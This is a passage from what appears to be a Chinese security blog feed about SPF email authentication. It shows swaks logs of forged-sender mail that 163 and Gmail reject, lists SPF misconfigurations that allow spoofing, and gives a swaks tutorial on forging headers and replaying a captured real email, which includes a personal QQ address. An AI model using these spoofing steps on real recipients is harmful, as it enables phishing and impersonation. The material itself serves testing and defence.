class="hljs-number">163.</span>com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">53</span>:<span class="hljs-number">24</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230325085324.000123</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to <span class="hljs-number">163</span> <br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;** <span class="hljs-number">550</span> DI:SPF <span class="hljs-number">163</span> mx65,EN1pCgAnf1uEth5knwhKCw-<span class="hljs-number">-.17116</span>S2 <span class="hljs-number">1679734404</span>,please see http:<span class="hljs-comment">//mail.163.com/help/help_spam_16.htm?ip=218.30.113.52&amp;hostid=mx65&amp;time=1679734404</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件google邮箱拒绝-1"><a href="#软拒绝-伪造的邮件google邮箱拒绝-1" class="headerlink" title="软拒绝-伪造的邮件google邮箱拒绝"></a>软拒绝-伪造的邮件google邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@gmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;~all forgery to google &quot;</span><br>=== Trying gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com:<span class="hljs-number">25.</span>..<br>=== Connected to gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com.<br>&lt;-  <span class="hljs-number">220</span> mx.google.com ESMTP b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; EHLO c87bd1816ee7<br>&lt;-  <span class="hljs-number">250</span>-mx.google.com at your service, [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">157286400</span><br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-ENHANCEDSTATUSCODES<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-CHUNKING<br>&lt;-  <span class="hljs-number">250</span> SMTPUTF8<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> OK b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; RCPT TO:&lt;test@gmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> OK b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span>  Go ahead b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; Date: Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">02</span>:<span class="hljs-number">37</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@gmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">02</span>:<span class="hljs-number">37</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230408070237.000051</span>@c87bd1816ee7&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt;<br> -&gt;  all forgery to google<br> -&gt;<br> -&gt;<br> -&gt; .<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> The MAIL FROM domain [vict.site] has an SPF record <span class="hljs-keyword">with</span> a hard fail<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> policy (-all) but it fails to pass SPF checks <span class="hljs-keyword">with</span> the ip:<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]. To best protect our users <span class="hljs-keyword">from</span> spam and phishing,<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> the message has been blocked. Please visit<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span>  https:<span class="hljs-comment">//support.google.com/mail/answer/81126#authentication for more</span><br>&lt;** <span class="hljs-number">550</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span> information. b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; QUIT<br>*** Remote host closed connection unexpectedly.<br></code></pre></td></tr></table></figure><h3 id="SPF绕过"><a href="#SPF绕过" class="headerlink" title="SPF绕过"></a>SPF绕过</h3><h4 id="配置不当"><a href="#配置不当" class="headerlink" title="配置不当"></a>配置不当</h4><h5 id="ip-范围过大"><a href="#ip-范围过大" class="headerlink" title="ip 范围过大"></a>ip 范围过大</h5><p>v&#x3D;spf1 ip4:113.113.1.1&#x2F;16 </p><p>允许范围为 113.113.1.1-113.113.255.255，会存在拿下一台服务器就可以实现绕过</p><h5 id="spf-软拒绝"><a href="#spf-软拒绝" class="headerlink" title="spf 软拒绝"></a>spf 软拒绝</h5><p>由于硬拒绝会直接拒收不符合条件的邮件，为避免邮件丢失，很多企业都会将SPF设置为软拒绝。这样就会导致存在</p><h5 id="spf-记录格式错误"><a href="#spf-记录格式错误" class="headerlink" title="spf 记录格式错误"></a>spf 记录格式错误</h5><p>特别注意，多个IP段，确保每个IP段的开头都是 ipv4</p><h5 id="邮件服务器未配置支持-spf"><a href="#邮件服务器未配置支持-spf" class="headerlink" title="邮件服务器未配置支持 spf"></a>邮件服务器未配置支持 spf</h5><p>spf有两步，第一步是在域名添加spf记录，第二步是在邮件服务器上配置支持spf</p><p>如果邮件服务器没有配置支持 spf，就例如我们声明了，但是无法验证</p><h5 id="spf-配置DNS错误"><a href="#spf-配置DNS错误" class="headerlink" title="spf 配置DNS错误"></a>spf 配置DNS错误</h5><p>spf 解析在公网 DNS，内部邮件服务器配置的是内网 DNS ，内网 DNS 无法解析 spf ，也就是邮件服务器无法使用公网 spf 验证</p><h5 id="内网缺乏限制"><a href="#内网缺乏限制" class="headerlink" title="内网缺乏限制"></a>内网缺乏限制</h5><p>攻击者进入内网，如果内部邮件服务器信任内网IP且开启</p><h3 id="SPF-报错"><a href="#SPF-报错" class="headerlink" title="SPF 报错"></a>SPF 报错</h3><h4 id="SPF-PermError-Too-Many-DNS-Lookups"><a href="#SPF-PermError-Too-Many-DNS-Lookups" class="headerlink" title="SPF PermError: Too Many DNS Lookups"></a>SPF PermError: Too Many DNS Lookups</h4><p>RFC 规范文档 <a href="https://tools.ietf.org/html/rfc7208">RFC7208</a> 规定每次SPF检查 DNS查询的 mechanisms 和 modifier 限制在十次以内，包括 include mechanism 或 redirect modifier 带来的查询。也就是说 SPF 查询所有允许IP的所需要的查询次数不可以超过 10 次，否则会返回“SPF PermError：too many DNS lookups”，SPF 永久错误在 DMARC 中被解释为 fail，从而会降低邮件送达率。</p><p>规避由于SPF DNS 查询造成的DDoS攻击，攻击过程为攻击者将可控的域名SPF记录指向被攻击域名，攻击者通过向不同的邮件服务器发送大量邮件，导致被攻击域名接受到 SPF DNS 查询的流量，如果被攻击域名SPF记录层级没有限制，就会造成DDoS攻击，如果限制在10次以内，放大倍数最多也就10倍，可以大幅度缓解攻击力度。</p><p>SPF查询次数查看</p><p><a href="https://dmarcly.com/tools/spf-record-checker">https://dmarcly.com/tools/spf-record-checker</a></p><p>解决方法</p><p>1、确保查询不要超过10次</p><p>2、使用 safe SPF ，也就是通过 dmarcly 生成特定的SPF记录规避超过十次</p><p>例如：</p><p>qq.com的SPF会被压缩如下SPF记录，需要更新原本域名的SPF记录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">v=spf1 include:_u<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>._spf<span class="hljs-selector-class">.dmarcld</span><span class="hljs-selector-class">.com</span> -<br></code></pre></td></tr></table></figure><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>SPF验证 envelope From 地址，不验证头域 From地址</p><p>查看收件方SPF校验结果</p><p>gmail</p><p>显示原始邮件</p><p>163</p><p>查看信头，Authentication-Results字段可查看spf验证结果</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Authentication-Results: zwqz-mx-mta-g2-3; <span class="hljs-attribute">spf</span>=pass smtp.<span class="hljs-attribute">mail</span>=admin@vict.site;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mailsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mailsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mailsec_swaks</title>
    <link href="/2024/05/16/security/itsec/mailsec/mailsec_swaks/"/>
    <url>/2024/05/16/security/itsec/mailsec/mailsec_swaks/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="swaks-SWiss-Army-Knife-Smtp"><a href="#swaks-SWiss-Army-Knife-Smtp" class="headerlink" title="swaks(SWiss Army Knife Smtp)"></a>swaks(SWiss Army Knife Smtp)</h2><h3 id="获取地址"><a href="#获取地址" class="headerlink" title="获取地址"></a>获取地址</h3><p>1、kali自带</p><p>2、官网</p><p><a href="http://www.jetmore.org/john/code/swaks/">http://www.jetmore.org/john/code/swaks/</a></p><p>3、yum install swaks</p><p>4、apt install swaks</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>swaks -to 被测试的邮箱</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>–header 邮件头信息，key:value (subject为标题)</p><p>–header-X-Mailer “value”   设置Mailer特征，不设置默认是带有swaks标记的（X-Mailer: swaks v20190914.0 jetmore.org&#x2F;john&#x2F;code&#x2F;swaks&#x2F;）</p><p>–header-Message-Id “value”   设置邮件Message-ID</p><p>–ehlo value 伪造ehlo头，要伪造发件人的域名，提供身份认证</p><p>–body value 邮件正文</p><p>–to 邮件接收者，多个接收者使用“,”进行分隔</p><p>–from 伪造的发件人</p><p>发送模板邮件</p><p>原始邮件转存为eml文件，swaks参数–data设置为保存的eml文件。</p><p>伪造的邮件和原始邮件不同点：</p><p>1、查看邮件原文：Sender不同</p><p>​Sender: <a href="mailto:&#x68;&#x61;&#119;&#107;&#48;&#64;&#118;&#105;&#99;&#x74;&#46;&#115;&#x69;&#x74;&#x65;">&#x68;&#x61;&#119;&#107;&#48;&#64;&#118;&#105;&#99;&#x74;&#46;&#115;&#x69;&#x74;&#x65;</a></p><p>​Sender: <a href="mailto:&#53;&#52;&#98;&#x37;&#102;&#99;&#x36;&#54;&#45;&#x33;&#x62;&#x30;&#51;&#x2d;&#49;&#x31;&#x65;&#99;&#45;&#x39;&#97;&#x37;&#x38;&#x2d;&#x35;&#x32;&#53;&#x34;&#x30;&#48;&#x31;&#98;&#100;&#x33;&#97;&#50;&#64;&#112;&#x6f;&#x73;&#x74;&#x6d;&#x61;&#110;&#46;&#x68;&#x75;&#x6f;&#120;&#105;&#97;&#x6e;&#x2e;&#x63;&#x6e;">&#53;&#52;&#98;&#x37;&#102;&#99;&#x36;&#54;&#45;&#x33;&#x62;&#x30;&#51;&#x2d;&#49;&#x31;&#x65;&#99;&#45;&#x39;&#97;&#x37;&#x38;&#x2d;&#x35;&#x32;&#53;&#x34;&#x30;&#48;&#x31;&#98;&#100;&#x33;&#97;&#50;&#64;&#112;&#x6f;&#x73;&#x74;&#x6d;&#x61;&#110;&#46;&#x68;&#x75;&#x6f;&#120;&#105;&#97;&#x6e;&#x2e;&#x63;&#x6e;</a></p><p>2、标题可设置不同</p><p>其他（包含时间）都是相同的</p><p>eml文件：【安全共识】项目进展通知_.eml</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Received:</span> from ucmailc115.sendcloud.org (ucmailc115.sendcloud.org [<span class="hljs-number">120.132</span>.<span class="hljs-number">55.74</span>])<br>by newxmmxsza90.qq.com (NewMX) <span class="hljs-keyword">with</span> SMTP id C8AB2C2<br>for <span class="hljs-operator">&lt;</span><span class="hljs-number">1482056240</span>@qq.com<span class="hljs-operator">&gt;</span>; Mon, <span class="hljs-number">01</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">19</span>:<span class="hljs-number">03</span>:<span class="hljs-number">08</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-params">X-QQ-mid:</span> xmmxsza90t1635764603tjang5mi6<br><span class="hljs-params">X-QQ-XMAILINFO:</span> NN7ERqmvDdhub2Gwh1cBAp8ZzlvgKuvJVy6fKhlhDpZG9E8bIRScTYUqG3hTCE<br> Y4fj96zCzu67ZxZmpg631lAQDnTVqdHCc<span class="hljs-symbol">/r3lVRH7mcp5jgtjBYHsIg2zFsTQdGZK9F8BFlWINJ8</span><br> iKUfRH<span class="hljs-operator">+</span>FurBOaJDyrswer<span class="hljs-symbol">/h96TmObwf9UcD/6fPQpvJHjFtmLr/c5ep4qAN9UtX+ZybWDsphvhMd</span><br> <span class="hljs-number">3</span>jB0Nzxg<span class="hljs-symbol">/pmuoic00tjRG6SWyEir6/B1gzxRndQeoTBkU20zMHRY5FVSWNtnOgY0Bzx4griypRFp</span><br> cQLpTQ5stdsB94vfI<span class="hljs-operator">+</span>EcF<span class="hljs-symbol">/QAFUY0X7lF2Vdym1OHKKFM4u/pL6dnaPltCmsfPDITeb0WAUobPavR</span><br> bImWPl2rQsL8gEplCOxZgKAmIfysWdDduA4wQfJ2C5nq<span class="hljs-symbol">/8Eej9PbG0KceZoYJ3o/SWAtP+bRWqa1</span><br> o0Jps0MvuYKWnwpZO<span class="hljs-operator">+</span>CfUdCKZJ5axZdpafgCWJ7NDYHtuPFYnNzogFh3I<span class="hljs-symbol">/0C8VWU/60Cntun6Xyb</span><br> W5MboPq6GgRTPmAqHjS50DR52Q1vQiu5f8MaKQxgQqY<span class="hljs-symbol">/CMKT0oqAJiRkSgRgK9MfT0KvkJPM45ro</span><br> OBuz290hepErsDTbd8oIY0FWOZkChmDwUYlnTg33REFl6bOFA1hOs5zcVbeP1fqaTfR6niUP7<span class="hljs-symbol">/yd</span><br> BiCOsHRZK97NyIJ<span class="hljs-symbol">/oxjeS97fmOqHWrTeaavxcIcFXranytIwb/oZ7F3IKb3IW70m4e2cSJhR8QjP</span><br> <span class="hljs-symbol">/de676fHF9eSkNpf5jEBVMbrrlBZqWq4tZRr6Nm1auIOU93FIZnffkcFeIsAfdjxixDpywwexR3Q</span><br> un4vdXkLyrAqYC1<span class="hljs-operator">+</span><span class="hljs-symbol">/lwCiaPYh9iyDofXi5eJsUcXTDooeD82xj4o41lvxOO/8b6rwzWorsRpgWcI</span><br> idzrFqXBBnKDju3Rw3tchjfQ<span class="hljs-operator">+</span>s9Rv1vBV<span class="hljs-operator">+</span>OJjwGBn8I5<span class="hljs-operator">+</span>Wl6mlyEE90cIqm1StCTj3M<span class="hljs-operator">+</span>fXxtLU9l<br> <span class="hljs-number">5</span>eeso3tVaqdE2OHrRWE<span class="hljs-symbol">/4WUrjjB01/PapvkvZbVnsk5I5ZB46n8Cq6eyZF5x2f/vOJB/3F85LRsN</span><br> Tt<span class="hljs-symbol">/uFp69RaBbDHhlw/+Zn8cPXiWSNe/MUmMqGw964RF4kbQdPQPQL7YgvaK+a/BNY1jngEzBylmc</span><br> <span class="hljs-number">6</span>C2rco2pTtDn0zC<span class="hljs-operator">+</span>GdnOGeDV6hGYg1EAUrjJd291rluoB9zBacMb8QolSw7w<span class="hljs-operator">==</span><br><span class="hljs-params">Sender:</span> <span class="hljs-number">54</span>b7fc66-<span class="hljs-number">3</span>b03-<span class="hljs-number">11</span>ec-<span class="hljs-number">9</span>a78-<span class="hljs-number">5254001</span>bd3a2@postman.huoxian.cn<br><span class="hljs-params">DKIM-Signature:</span> v<span class="hljs-operator">=</span><span class="hljs-number">1</span>; <span class="hljs-attr">a</span><span class="hljs-operator">=</span>rsa-sha256; <span class="hljs-attr">c</span><span class="hljs-operator">=</span>relaxed<span class="hljs-symbol">/simple</span>;<br> <span class="hljs-attr">d</span><span class="hljs-operator">=</span>postman.huoxian.cn; <span class="hljs-attr">i</span><span class="hljs-operator">=</span>@postman.huoxian.cn; <span class="hljs-attr">q</span><span class="hljs-operator">=</span>dns<span class="hljs-symbol">/txt</span>; <span class="hljs-attr">s</span><span class="hljs-operator">=</span>mail;<br> <span class="hljs-attr">t</span><span class="hljs-operator">=</span><span class="hljs-number">1635764603</span>; <span class="hljs-attr">h</span><span class="hljs-operator">=</span><span class="hljs-params">content-type :</span> <span class="hljs-params">mime-version :</span> <span class="hljs-params">subject :</span> <span class="hljs-params">from :</span> <span class="hljs-params">to :</span><br> <span class="hljs-params">date :</span> <span class="hljs-params">message-id :</span> <span class="hljs-params">reply-to :</span> <span class="hljs-params">list-unsubscribe :</span> from;<br> <span class="hljs-attr">bh</span><span class="hljs-operator">=</span>U<span class="hljs-operator">/</span>bh3WoQkLMciTodzPBwWfHFVUFbvh8pMVFSu0WVXg4<span class="hljs-operator">=</span>;<br> <span class="hljs-attr">b</span><span class="hljs-operator">=</span>AWHql3thwjkoShz2wkl5Q5CotpxBIhm<span class="hljs-symbol">/cYX8iC84lcx9zYSwr82Z5vUUY1xbVVQBWfVVR</span><br> ejKixS7qPF90EtKOfWmhQMF1Gu4PBq9suFOJL5DaDtQDrssSm6cw0KyKZnde00qyCGBowPj<br> kZlLgHGovi<span class="hljs-operator">/</span><span class="hljs-operator">+</span><span class="hljs-number">5</span>V33q7OepO9LbBseIsk<span class="hljs-operator">=</span><br><span class="hljs-params">Received:</span> from huoxian-sso-prod-celery-<span class="hljs-number">5</span>fdf486bd4-<span class="hljs-number">7</span>tpp5 (Unknown [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>])         by SendCloud Inbound Server <span class="hljs-keyword">with</span> ESMTPA id <span class="hljs-number">38</span>BF8035-<span class="hljs-number">1</span>FF3-<span class="hljs-number">46</span>E1-<span class="hljs-number">907</span>E-<span class="hljs-number">80</span>EBEF09BE0E.<span class="hljs-number">1</span>         envelope-from <span class="hljs-operator">&lt;</span>noreplay@postman.huoxian.cn<span class="hljs-operator">&gt;</span> (authenticated bits<span class="hljs-operator">=</span><span class="hljs-number">0</span>); Mon, <span class="hljs-number">01</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">19</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/alternative</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;===============9079726093015921879==&quot;</span><br><span class="hljs-params">MIME-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-params">Subject:</span> <span class="hljs-operator">=</span><span class="hljs-operator">?</span>utf-<span class="hljs-number">8</span><span class="hljs-operator">?</span>b<span class="hljs-operator">?</span><span class="hljs-number">44</span>CQ5a6J5YWo5YWx6K<span class="hljs-operator">+</span>G44CR6aG555uu6L<span class="hljs-operator">+</span>b5bGV6YCa55<span class="hljs-operator">+</span>l<span class="hljs-operator">?</span><span class="hljs-operator">=</span><br><span class="hljs-params">From:</span> noreplay@postman.huoxian.cn<br><span class="hljs-params">To:</span> <span class="hljs-number">1482056240</span>@qq.com<br><span class="hljs-params">Date:</span> Mon, <span class="hljs-number">01</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">03</span>:<span class="hljs-number">23</span> <span class="hljs-operator">-</span><span class="hljs-number">0000</span><br><span class="hljs-params">Message-ID:</span> <span class="hljs-operator">&lt;</span><span class="hljs-number">1635764603279</span>_101502_7386_9958.sc-<span class="hljs-number">10</span>_9_13_213-inbound0@postman.huoxian.cn<span class="hljs-operator">&gt;</span><br><span class="hljs-params">REPLY-TO:</span> noreplay@postman.huoxian.cn<br><span class="hljs-params">X-SENDCLOUD-UUID:</span> <span class="hljs-number">1635764603279</span>_101502_7386_9958.sc-<span class="hljs-number">10</span>_9_13_213-inbound0$<span class="hljs-number">1482056240</span>@qq.com<br><span class="hljs-params">X-SENDCLOUD-LOG:</span> <span class="hljs-number">1635764603279</span>_101502_7386_9958.sc-<span class="hljs-number">10</span>_9_13_213-inbound0$<span class="hljs-number">1482056240</span>@qq.com<span class="hljs-comment">#1482056240@qq.com#239907#101502#0#false#false#0#-1</span><br><span class="hljs-params">X-SENDCLOUD-LOG-NEW:</span> MTYzNTc2NDYwMzI3OV8xMDE1MDJfNzM4Nl85OTU4LnNjLTEwXzlfMTNfMjEzLWluYm91bmQwJDE0ODIwNTYyNDBAcXEuY29tIzE0ODIwNTYyNDBAcXEuY29tIzIzOTkwNyMxMDE1MDIjMCNmYWxzZSNmYWxzZSMwIy0x<br><span class="hljs-params">X-SMTPAPI:</span> <br><span class="hljs-params">List-Unsubscribe:</span> <span class="hljs-operator">&lt;</span>mailto:<span class="hljs-number">0</span>_239907_1635764603279_101502_7386_9958.sc-<span class="hljs-number">10</span>_9_13_213-inbound0@postman.huoxian.cn<span class="hljs-operator">&gt;</span><br><br><br><span class="hljs-operator">-</span>-<span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-number">9079726093015921879</span><span class="hljs-operator">==</span><br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span><br><span class="hljs-params">MIME-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-params">Content-Transfer-Encoding:</span> <span class="hljs-number">7</span>bit<br><br>Here is the message.<br><span class="hljs-operator">-</span>-<span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-number">9079726093015921879</span><span class="hljs-operator">==</span><br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/html</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span><br><span class="hljs-params">MIME-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-params">Content-Transfer-Encoding:</span> <span class="hljs-number">8</span>bit<br><br><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>DOCTYPE html<span class="hljs-operator">&gt;</span><br>                            <span class="hljs-operator">&lt;</span>html lang<span class="hljs-operator">=</span><span class="hljs-string">&quot;en&quot;</span><span class="hljs-operator">&gt;</span><br>                                 <span class="hljs-symbol">&lt;body&gt;</span><br>                                    <span class="hljs-symbol">&lt;p&gt;</span>您关注的项目「某互联网银行安全测试项目」,项目已开始，项目开始时间:<span class="hljs-number">202</span>1-<span class="hljs-number">1</span>1-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>,结束时间:<span class="hljs-number">202</span>1-<span class="hljs-number">1</span>1-<span class="hljs-number">30</span> <span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span>,请及时登录火线平台参与项目<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>p<span class="hljs-operator">&gt;</span><br>                                     <span class="hljs-symbol">&lt;button&gt;</span><span class="hljs-operator">&lt;</span>a  href<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://sctrack.sendcloud.net/track/click/eyJuZXRlYXNlIjogImZhbHNlIiwgIm1haWxsaXN0X2lkIjogMCwgInRhc2tfaWQiOiAiIiwgImVtYWlsX2lkIjogIjE2MzU3NjQ2MDMyNzlfMTAxNTAyXzczODZfOTk1OC5zYy0xMF85XzEzXzIxMy1pbmJvdW5kMCQxNDgyMDU2MjQwQHFxLmNvbSIsICJzaWduIjogIjYwMGRhMzliNDAyNDgyYzk1MDE2MGRkMmNlMzZhODQwIiwgInVzZXJfaGVhZGVycyI6IHt9LCAibGFiZWwiOiAwLCAidHJhY2tfZG9tYWluIjogInNjdHJhY2suc2VuZGNsb3VkLm5ldCIsICJyZWFsX3R5cGUiOiAiIiwgImxpbmsiOiAiaHR0cHMlM0EvL3d3dy5odW94aWFuLmNuL3Byb2plY3QvZGV0YWlsJTNGcGlkJTNEMjExIiwgIm91dF9pcCI6ICIxMjAuMTMyLjU1Ljc0IiwgImNvbnRlbnRfdHlwZSI6ICIwIiwgInVzZXJfaWQiOiAxMDE1MDIsICJvdmVyc2VhcyI6ICJmYWxzZSIsICJjYXRlZ29yeV9pZCI6IDIzOTkwN30=.html&quot;</span>  <span class="hljs-operator">&gt;</span>查看详情<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>button<span class="hljs-operator">&gt;</span><br>                                 <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>body<span class="hljs-operator">&gt;</span><br>                            <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>html<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>table cellpadding<span class="hljs-operator">=</span><span class="hljs-string">&quot;0&quot;</span> cellspacing<span class="hljs-operator">=</span><span class="hljs-string">&quot;0&quot;</span> border<span class="hljs-operator">=</span><span class="hljs-string">&quot;0&quot;</span> width<span class="hljs-operator">=</span><span class="hljs-string">&quot;100%&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-symbol">&lt;tr&gt;</span><span class="hljs-operator">&lt;</span>td align<span class="hljs-operator">=</span><span class="hljs-string">&quot;center&quot;</span> style<span class="hljs-operator">=</span><span class="hljs-string">&quot;padding-top: 10px;&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>div style<span class="hljs-operator">=</span><span class="hljs-string">&quot;border-top:1px solid #ddd;padding:10px;&quot;</span><span class="hljs-operator">&gt;</span><span 